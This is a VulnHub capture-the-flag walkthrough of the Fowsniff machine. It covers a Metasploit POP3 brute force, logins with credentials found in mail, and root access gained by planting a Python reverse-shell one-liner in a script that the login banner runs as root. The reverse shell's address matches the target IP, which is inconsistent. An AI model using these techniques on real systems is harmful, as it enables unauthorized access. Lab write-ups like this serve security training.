<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Fowsniff: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-11-19T18:09:11+00:00">November 19, 2018</time><time class="updated" datetime="2025-06-10T20:11:58+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as Fowsniff. The credit for making this VM machine goes to “berzerk0” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/fowsniff-1,262/#download">here</a></span>.</span></p>
<p><span style="color: #000000;">Security Level: Beginner</span></p>
<p><span style="color: #000000;">Flags: There is one flag (flag.txt).</span></p>
<h3><span style="color: #800000;"><strong>Table of Contents:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Port scanning and IP discovery.</span></li>
<li><span style="color: #000000;">Hitting on port 80</span></li>
<li><span style="color: #000000;">Finding hashes on Pastebin</span></li>
<li><span style="color: #000000;">Decoding hashes</span></li>
<li><span style="color: #000000;">Brute force pop3 login</span></li>
<li><span style="color: #000000;">Connecting to pop3</span></li>
<li><span style="color: #000000;">Finding SSH username and password</span></li>
<li><span style="color: #000000;">Finding privilege escalation vectors</span></li>
<li><span style="color: #000000;">Exploiting Misconfiguration in system</span></li>
<li><span style="color: #000000;">Getting root access.</span></li>
<li><span style="color: #000000;">Reading the flags.</span></li>
</ul>
<p><span style="color: #000000;">Walkthrough</span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jrpTxSXdLPI/W_L6Zi_8J2I/AAAAAAAAbP8/EJxLeI_w7toKAt91fQTUQ5GRMmxo2bkTACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.29</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with nmap.</span></p>
<pre class="lang:default decode:true">nmap -A -p- -T4 192.168.1.29</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vps5hC1HGFY/W_L6cSQiqZI/AAAAAAAAbQk/NBRSGg-wek0mqWjKZxLMP-B59TPn_eYXQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that there are 4 ports open: 22(SSH), 80(HTTP), 110(POP3), 143(IMAP)</span></p>
<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-zDZW76aWBic/W_L6cuGnqsI/AAAAAAAAbQo/-C-oY3HjBuAVpV8G_piLXwIZTpYxBAvSACEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the webpage. Dirb scan and Nikto also didn’t reveal anything, so we googled “fowsniff corp” and found a Pastebin link that contained username and passwords. (You can find the link <span style="color: #0000ff;">here</span>)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-P6Envthdk5c/W_L6c8KM-KI/AAAAAAAAbQs/mGofz1MgSWYLuRBPJNo2Mll-BiV2Gy1TQCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We cracked the hashes use this site and find passwords to the respective email addresses. But only 8 hashes were cracked and there are 9 usernames.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-i0o__cy5lwY/W_L6dIH0E_I/AAAAAAAAbQw/pWnyNvutw8oYi7wdZOn5d95DMCHVeBWVgCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So we create two wordlists one for username and one for passwords, we will use this to brute force pop3 login.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rjmUz7W5H2g/W_L6dE8SWQI/AAAAAAAAbQ0/UwsEpNYLoLYyaOYtCuW5OFQm5V0c9jjsACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We use Metasploit-framework to brute force pop3 login. After running the brute forcing pop3 login we find the correct credentials to be “<strong>seina:scoobydoo2</strong>”.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/pop3/pop3_login
msf auxiliary(scanner/pop3/pop3_login) &gt; set rhosts 192.168.1.29
msf auxiliary(scanner/pop3/pop3_login) &gt; set user_file user.txt
msf auxiliary(scanner/pop3/pop3_login) &gt; set pass_file pass.txt
msf auxiliary(scanner/pop3/pop3_login) &gt; set verbose false
msf auxiliary(scanner/pop3/pop3_login) &gt; run</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-ESD068dIJ5w/W_L6dR47HnI/AAAAAAAAbQ4/gvhgUtZVMrcOD_KGHEXwrbJeIOzPG8dPQCEwYBhgL/s1600/7.png"/></strong></span></p>
<p><span style="color: #000000;">We connect to pop3 service on the target server and login using the credentials we retrieved. After logging in we list the messages and find there are 2 messages.</span></p>
<pre class="lang:default decode:true">nc 192.168.1.29 110
user seina
pass scoobydoo2
list</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-4rztPGl7PRs/W_L6dz7yPTI/AAAAAAAAbQ8/oQGQ3S6S3CMLVcKt3clCF7QMSFRC16tIgCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We retrieved the 1<sup>st</sup> message and find that it contains the password to connect through SSH.</span></p>
<pre class="lang:default decode:true">retr 1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-x7gBk-FFzNM/W_L6eMfkcfI/AAAAAAAAbRA/hZlnnetoCuQQeIivww4oWYsBpnOgcjW1QCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We retrieved the second message and find a message that hints that use the username “baksteen”.</span></p>
<pre class="lang:default decode:true">retr 2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pZ-BiAlZi_0/W_L6ZtOMt3I/AAAAAAAAbQA/5UWt6rL8gIY8YAoE8uHmHYsMQmz5_lACgCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We use the credentials “<strong>baksteen:S1ck3nBluff+secureshell</strong>” to login through SSH.</span></p>
<pre class="lang:default decode:true">ssh baksteen@192.168.1.29</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EiUoVWZXK9U/W_L6ZvhYuBI/AAAAAAAAbP4/yMnUget0oX4A_LlvD8p3En3JiJfKjS4zACEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">After gaining access we enumerate the system, as user “baksteen” belongs to two different groups. We use to try to find files that belong to the “users” group and find a file called “cube.sh”.</span></p>
<pre class="lang:default decode:true">find / -group users -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PELB_tPWvrA/W_L6aUA6oOI/AAAAAAAAbQE/r1hUVz7K2aclfHKxpw8r29k-rVz4o-MuwCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">We take a look at the content of the file and find it contains the message that comes once we login through SSH.</span></p>
<pre class="lang:default decode:true">cd /opt/cube
cat cube.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-A4DvVDjp0QY/W_L6aqewOeI/AAAAAAAAbQI/mwiKAUqaJ6cBEMI2QznkU87IOI7P5KjSgCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We open the file with vim and add python reverse shell one-liner in the file.</span></p>
<pre class="lang:default decode:true">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CGiTYYsHP48/W_L6amo4cEI/AAAAAAAAbQM/g4_nbmWlRdYQLdR6sWjbOnSIRF7sDriZgCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We try to run it and find it gives an error “python: command is not found”. We try to locate Python and find it contains python3.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8-HyKLzOAKA/W_L6awFEruI/AAAAAAAAbQQ/XOG4o2LiwRY1TkiYFME6Oi77LYNuZYomACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">So we make changes to the exploit we change the python reverse shell one-liner. We replace python with python3.</span></p>
<pre class="lang:default decode:true">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GVZZxqfcyMs/W_L6bZJ_53I/AAAAAAAAbQU/omXt2EdEe6UI3WlIVrpeuWBqrJKPSKTMgCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">As when we login through SSH we get a banner similar to the one that “<strong>cube.sh</strong>” contains. So we check “<strong>/etc/update-motd.d/</strong>” directory to look for executables that might run this program and find that file “<strong>00-header</strong>” runs this shell script.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ADij_RH1_oQ/W_L6be2ul2I/AAAAAAAAbQY/2NAj5AESsHQfFBxKwRo7WZ8IcVtzQsxagCEwYBhgL/s1600/17.1.png"/></span></p>
<p><span style="color: #000000;">So now we exit the SSH and set up our listener using netcat, then we again connect through SSH. So that our reverse shell gets executed.</span></p>
<pre class="lang:default decode:true">ssh baksteen@192.168.1.29</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tEozl34-Ppc/W_L6bnpNsAI/AAAAAAAAbQc/P06JNpq7pbMe52XeJcCWUawQWIaeoBIdACEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">As soon as we successfully login, we get a reverse shell as root user on our netcat listener. We go to the root directory and find the file called “flag.txt”. We take a look at the content of the file and find the congratulatory message.</span></p>
<pre class="lang:default decode:true ">nc -lvp 1234
id
cd /root
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OvFz55a5MiU/W_L6b1ajD4I/AAAAAAAAbQg/JzDC-_gqzcoVavwjedecDS0Csj-RAFRAQCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
